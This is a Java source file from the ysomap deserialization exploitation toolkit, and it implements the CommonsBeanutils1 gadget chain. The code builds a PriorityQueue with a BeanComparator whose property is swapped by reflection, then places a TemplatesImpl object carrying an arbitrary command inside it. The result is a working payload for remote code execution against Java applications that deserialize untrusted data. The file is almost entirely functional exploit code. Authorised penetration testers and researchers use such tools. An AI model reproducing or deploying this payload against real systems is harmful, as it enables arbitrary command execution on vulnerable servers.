package ysomap.core.payload.java.collections;

import org.apache.commons.beanutils.BeanComparator;
import ysomap.common.annotation.Authors;
import ysomap.common.annotation.Dependencies;
import ysomap.common.annotation.Payloads;
import ysomap.common.annotation.Require;
import ysomap.core.bean.Bullet;
import ysomap.core.bean.Payload;
import ysomap.core.bullet.jdk.TemplatesImplBullet;
import ysomap.core.util.ReflectionHelper;

import java.util.PriorityQueue;

/**
 * @author wh1t3P1g
 * @since 2020/5/14
 */
@Payloads
@SuppressWarnings({"rawtypes"})
@Authors({ Authors.FROHOFF })
@Require(bullets = {"TemplatesImplBullet"},param = false)
@Dependencies({"commons-beanutils:commons-beanutils:1.9.2", "commons-collections:commons-collections:3.1", "commons-logging:commons-logging:1.2"})
public class CommonsBeanutils1 extends Payload<Object> {

    @Override
    public Bullet getDefaultBullet(String command) throws Exception {
        return new TemplatesImplBullet().set("body",command);
    }

    @Override
    public Object pack(Object obj) throws Exception {
//        final BeanComparator comparator = new BeanComparator("lowestSetBit");
        // case from https://www.leavesongs.com/PENETRATION/commons-beanutils-without-commons-collections.html
        // remove beanutils' cc dependency
        final BeanComparator comparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);
        String action = bullet.get("action");
        // create queue with numbers and basic comparator
        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
        // stub data for replacement later
        queue.add("1");
        queue.add("1");

        // switch method called by comparator
        ReflectionHelper.setFieldValue(comparator, "property", action);

        // switch contents of queue
        final Object[] queueArray = (Object[]) ReflectionHelper.getFieldValue(queue, "queue");
        queueArray[0] = obj;
        queueArray[1] = obj;

        return queue;
    }

}
